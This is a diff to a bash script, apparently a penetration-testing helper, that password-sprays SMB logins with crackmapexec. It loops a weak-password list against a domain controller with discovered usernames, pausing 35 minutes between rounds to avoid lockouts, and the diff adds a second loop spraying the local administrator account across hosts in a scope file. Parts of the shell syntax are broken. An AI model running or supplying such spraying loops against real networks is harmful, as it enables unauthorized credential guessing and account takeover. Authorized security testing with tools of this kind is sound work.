@@ -1,5 +1,8 @@
 #! /bin/bash
-
+##work in progress - do not use in production - 8/1/2023
+##required github.com/dodiorne/lists
+##define scope.txt in ~
+##
 echo "  /$$$$$$  /$$      /$$ /$$$$$$$$  /$$$$$$                                        ";
 echo " /$$__  $$| $$$    /$$$| $$_____/ /$$__  $$                                       ";
 echo "| $$  \__/| $$$$  /$$$$| $$      | $$  \__/  /$$$$$$   /$$$$$$  /$$$$$$  /$$   /$$";
@@ -21,3 +24,7 @@ if [$1 = "y"] || [$1="Y"]; l="--local-auth"; else l=""
 echo $l
 pause
 for i in $(cat lists/weak_passwords.txt); do crackmapexec smb "dc_ip" -u discovered-usernames.txt -p $i; echo $i; sleep 35m; done 
+
+##local auth
+for i in $(cat ~/lists/weak_passwords.txt); do crackmapexec smb ~/scope.txt --local-auth -u administrator -p $i; echo sleeping; t=1800;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done
+
